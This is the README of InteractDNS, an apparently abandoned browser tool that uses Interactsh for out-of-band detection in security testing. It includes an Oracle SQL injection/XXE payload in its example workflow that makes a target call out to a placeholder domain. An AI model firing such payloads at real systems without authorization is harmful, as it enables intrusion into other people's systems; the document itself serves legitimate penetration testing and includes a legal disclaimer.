# Project stopped [ Not working as intented ]


# InteractDNS

A free and open-source Burp Collaborator alternative powered by Interactsh for detecting out-of-band interactions during security testing.

![InteractDNS](https://github.com/yourusername/interactdns/raw/main/screenshot.png)

## Overview

InteractDNS provides security testers with an easy-to-use interface for detecting out-of-band (OOB) interactions when testing for vulnerabilities like SQL injections, SSRF, XXE, and other exploits that trigger DNS lookups. Unlike traditional methods, InteractDNS can detect actual server-side requests that would otherwise remain invisible during testing.

The tool leverages the powerful Interactsh service developed by ProjectDiscovery, providing a free alternative to Burp Collaborator with a clean, user-friendly interface.

## Features

- **Automatic Domain Generation**: Creates a unique Interactsh domain for testing
- **Real-time Interaction Monitoring**: Polls the Interactsh API regularly to capture DNS, HTTP, and SMTP interactions
- **Database-specific Payloads**: Pre-configured SQL injection payloads for Oracle, MS SQL, MySQL, and PostgreSQL
- **Persistent Logging**: Stores interaction logs in the browser's local storage
- **User-friendly Interface**: Clean, responsive design with tabbed navigation
- **One-click Copy**: Easily copy domains and payload examples to clipboard
- **Download Logs**: Export interaction logs for further analysis

## How It Works

InteractDNS integrates Interactsh backend capabilities with a user-friendly frontend:

1. **Interactsh Integration**:
    - Automatically registers with the Interactsh server (oast.fun) to generate a unique subdomain
    - Periodically polls for new interactions using the server API
    - Processes and displays interaction data in real-time
2. **Out-of-band Detection**:
    - When your payload executes on a vulnerable server, it triggers a DNS lookup or HTTP request
    - The Interactsh server captures these interactions and makes them available via its API
    - InteractDNS displays these interactions with timestamps, protocols, and relevant data

## Installation

1. Clone this repository:
    
	```bash
    git clone https://github.com/yourusername/interactdns.git
   ```

2. Open `index.html` in your browser or host the files on a web server.

No additional dependencies or installations are required as InteractDNS runs entirely in the browser.

## Usage

1. Open the application in your browser
2. A unique Interactsh domain will be automatically generated for you
3. Select the tab for your target database system (Oracle, MSSQL, MySQL, PostgreSQL)
4. Copy the pre-configured SQL injection payload with your unique domain
5. Use the payload in your security testing
6. Any DNS lookups or HTTP requests triggered by your payload will appear in the logs section
7. Use the control buttons to clear logs, download logs, or toggle polling as needed

### Example Workflow

1. Copy the Oracle SQL injection payload:
    
    ```sql
    1' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-DOMAIN-HERE/"> %remote;]>'),'/l') FROM dual--
    ```
    
2. Use this payload in a vulnerable application input field
3. If the application is vulnerable to SQL injection and XXE, it will trigger a DNS lookup to your unique domain
4. The interaction will appear in the logs section of InteractDNS with details about the timestamp, remote IP, and other relevant data

## Technical Details

### Components

- **HTML/CSS**: Provides the user interface with responsive design
- **JavaScript**: Handles Interactsh API integration, domain generation, and interaction display
- **Interactsh API**: External service that provides DNS, HTTP, and SMTP interaction capture

### Configuration

The application uses the following default configuration:

```javascript
const CONFIG = {
    interactshServer: 'oast.fun', // Default server
     pollingInterval: 5000, // Poll every 5 seconds
     maxLogs: 100 // Maximum number of logs to keep
 };
```

You can modify these settings in the `script.js` file.

## Security Considerations

- All interactions are stored locally in your browser
- No data is transmitted to third-party services other than the Interactsh API
- Interactsh domains are temporary and expire after a period of inactivity
- For sensitive testing, consider hosting your own Interactsh server

## Advantages Over Similar Tools

Unlike Burp Collaborator, InteractDNS:

- Is completely free and open-source
- Doesn't require Burp Suite Professional
- Can be used directly in the browser without additional software
- Provides a clean, intuitive interface specifically designed for security testing

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## License

This project is licensed under the MIT License - see the [LICENSE](LICENCE) file for details.

## Acknowledgements

- [Interactsh](https://github.com/projectdiscovery/interactsh) for developing the Interactsh backend
- sudo-hope0529(KRISHNA DWIVEDI)

---

## Disclaimer and Legal Considerations

### Important Legal Disclaimer

**READ CAREFULLY BEFORE USING THIS TOOL**

InteractDNS is provided for legitimate security testing purposes only. The creators and contributors of this tool:

1. Accept NO RESPONSIBILITY and have NO LIABILITY for any misuse of this tool.
2. Are NOT RESPONSIBLE for any actions taken by users of this tool. You, as the user, bear SOLE RESPONSIBILITY for all actions performed using this tool and their consequences.
3. Make NO WARRANTY regarding the legality of using this tool in any specific context or jurisdiction.

### Legal Requirements

By using InteractDNS, you acknowledge and agree that:

1. You will ONLY use this tool on systems and applications for which you have EXPLICIT PERMISSION to test.
2. You will ALWAYS obtain proper written authorization before performing any security testing.
3. You will comply with all applicable local, state, national, and international laws while using this tool.
4. You will NOT use this tool for any malicious, harmful, or illegal purposes.
5. Unauthorized security testing may violate cybersecurity laws, including but not limited to:

- The Information Technology Act, 2000 (IT Act) in India, particularly Sections 43 and 66 which address unauthorized access to computer systems and hacking.
- The Computer Fraud and Abuse Act (CFAA) in the United States
- Other countries laws.

### Risk Acknowledgment

Security testing carries inherent risks. Even when used properly and with authorization:

1. This tool may cause unexpected system behavior, including but not limited to system crashes, data loss, or service disruptions.
2. You acknowledge these risks and accept full responsibility for any consequences.

### Indemnification

By using InteractDNS, you agree to indemnify, defend, and hold harmless the creators, contributors, and any affiliated parties from any claims, damages, losses, liabilities, costs, and expenses (including attorney's fees) arising from your use or misuse of this tool.

---

### If you liked 👍 this tool, visit my other repos to have a look 👀 on them 📂.

## Thank You 🙏

## sudo-hope0529 (KRISHNA DWIVEDI)
